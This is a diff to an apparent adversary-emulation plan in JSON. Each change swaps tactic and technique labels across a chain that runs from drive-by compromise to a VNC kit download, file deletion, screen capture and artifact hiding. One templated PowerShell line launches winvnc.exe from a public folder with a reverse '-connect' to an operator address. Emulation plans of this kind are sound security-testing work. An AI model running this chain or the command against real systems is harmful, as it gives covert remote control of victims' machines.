@@ -9,16 +9,16 @@
     },
     "procedures": [
         {
-            "tactic": "Actuator",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Actuator",
             "label": "actuator",
             "preconditions": {
                 "tool": "self.tool_name"
             }
         },
         {
-            "tactic": "Interfaces",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Interfaces",
             "label": "Interfaces",
             "preconditions": {
                 "tool": "self.tool",
@@ -27,8 +27,8 @@
             }
         },
         {
-            "tactic": "DNS",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "DNS",
             "label": "DNS",
             "preconditions": {
                 "tool": "self.tool",
@@ -37,8 +37,8 @@
             }
         },
         {
-            "tactic": "NGINX",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "NGINX",
             "label": "NGINX",
             "preconditions": {
                 "self.tool_name": "self.tool",
@@ -49,24 +49,24 @@
             }
         },
         {
-            "tactic": "Interfaces",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Interfaces",
             "label": "Interfaces2",
             "preconditions": {
                 "driveby": "self.driveby2"
             }
         },
         {
-            "tactic": "DNS",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "DNS",
             "label": "DNS2",
             "preconditions": {
                 "driveby": "self.driveby2"
             }
         },
         {
-            "tactic": "NGINX",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "NGINX",
             "label": "NGINX2",
             "preconditions": {
                 "payload": "vnc_recon_v1-kit.zip",
@@ -75,16 +75,16 @@
             }
         },
         {
-            "tactic": "PayloadCheapride",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "PayloadCheapride",
             "label": "Payload",
             "preconditions": {
                 "tool": "self.tool"
             }
         },
         {
-            "tactic": "DriveByCompromise",
-            "technique": "InitialAccess",
+            "tactic": "InitialAccess",
+            "technique": "DriveByCompromise",
             "label": "driveByCompromise",
             "preconditions": {
                 "actuator": "self.actuator",
@@ -95,8 +95,8 @@
             }
         },
         {
-            "tactic": "UserExecution",
-            "technique": "Execution",
+            "tactic": "Execution",
+            "technique": "UserExecution",
             "label": "userExecution",
             "preconditions": {
                 "actuator_id": "self.actuator",
@@ -107,8 +107,8 @@
             }
         },
         {
-            "tactic": "WebProtocols",
-            "technique": "c2",
+            "tactic": "c2",
+            "technique": "WebProtocols",
             "label": "webProtocols_1",
             "preconditions": {
                 "actuator_id": "self.actuator",
@@ -119,8 +119,8 @@
             }
         },
         {
-            "tactic": "IngressToolTransfer",
-            "technique": "c2",
+            "tactic": "c2",
+            "technique": "IngressToolTransfer",
             "label": "Get-vnc-kit_t1_1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -135,8 +135,8 @@
             }
         },
         {
-            "tactic": "DeobfuscateDecodeFilesOrInformation",
-            "technique": "DefenseEvasion",
+            "tactic": "DefenseEvasion",
+            "technique": "DeobfuscateDecodeFilesOrInformation",
             "label": "Uncompress-kit_t1_2",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -148,8 +148,8 @@
             }
         },
         {
-            "tactic": "FileDeletionPowershell",
-            "technique": "DefenseEvasion",
+            "tactic": "DefenseEvasion",
+            "technique": "FileDeletionPowershell",
             "label": "FileDeletion_t1_3",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -161,8 +161,8 @@
             }
         },
         {
-            "tactic": "RemoteAccessSoftware",
-            "technique": "c2",
+            "tactic": "c2",
+            "technique": "RemoteAccessSoftware",
             "label": "Start-VNC_t1_4",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -171,7 +171,7 @@
                 "tune": {
                     "command": {
                         "template": [
-                            "powershell &{Start-Process C:\\Users\\Public\\vnc-kit\\winvnc.exe; Start-sleep 5; C:\\Users\\Public\\vnc-kit\\winvnc.exe -connect ",
+                            "powershell &{Start-Process C:\\Users\\Public\\vnc-kit\\winvnc.exe; Start-sleep 5; C:\\Users\\Public\\vnc-kit\\winvnc.exe -connect",
                             {
                                 "kind": "slice",
                                 "slice": 0,
@@ -195,8 +195,8 @@
             }
         },
         {
-            "tactic": "RemoteAccessSoftware",
-            "technique": "c2",
+            "tactic": "c2",
+            "technique": "RemoteAccessSoftware",
             "label": "Recon-Box_t1_5",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -208,8 +208,8 @@
             }
         },
         {
-            "tactic": "ScreenCapture",
-            "technique": "Collection",
+            "tactic": "Collection",
+            "technique": "ScreenCapture",
             "label": "ScreenCapture_t1_6",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -221,8 +221,8 @@
             }
         },
         {
-            "tactic": "HideArtifacts",
-            "technique": "DefenseEvasion",
+            "tactic": "DefenseEvasion",
+            "technique": "HideArtifacts",
             "label": "Stop-VNC_t1_7",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -234,8 +234,8 @@
             }
         },
         {
-            "tactic": "AgentExit",
-            "technique": "Utility",
+            "tactic": "Utility",
+            "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
                 "agent": "self.agent_tgt1",
